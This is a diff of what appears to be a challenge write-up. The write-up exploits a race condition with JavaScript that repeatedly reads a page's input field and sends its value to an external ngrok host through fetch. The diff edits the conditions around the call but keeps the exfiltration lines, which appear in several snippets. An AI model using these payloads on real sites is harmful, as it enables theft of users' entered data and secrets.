@@ -104,7 +104,7 @@ Put together an html code that as input field:
         <script>
           window.addEventListener('load', () => {
                 let elem = document.querySelector("input");
-                if(elem.value || true){
+                if(elem.value){
                     fetch("https://f5d4-101-50-76-194.ngrok-free.app/?value=" + (elem.value || "nothing"));
                 }
             });
@@ -128,10 +128,8 @@ To exploit the race condition, i simply replaced the `addEventListener` with `se
 ```javascript
 setInterval(() => {
   let elem = document.querySelector("input");
-  if(elem.value || true){
+  if(elem.value){
       fetch("https://f5d4-101-50-76-194.ngrok-free.app/?value=" + (elem.value || "nothing"));
-  }else{
-      console.log("Hello WORLD");
   }
 }, 20);
 ```
@@ -147,10 +145,8 @@ setInterval(() => {
   }, "*");
 
   let elem = document.querySelector("input");
-  if(elem.value || true){
+  if(elem.value){
       fetch("https://f5d4-101-50-76-194.ngrok-free.app/?value=" + (elem.value || "nothing"));
-  }else{
-      console.log("Hello WORLD");
   }
 }, 20);
 ```
@@ -188,10 +184,8 @@ html_content = r"""
                 }, "*");
 
                 let elem = document.querySelector("input");
-                if(elem.value || true){
+                if(elem.value){
                     fetch("https://f5d4-101-50-76-194.ngrok-free.app/?value=" + (elem.value || "nothing"));
-                }else{
-                    console.log("Hello WORLD");
                 }
             }, 20);
     </script>
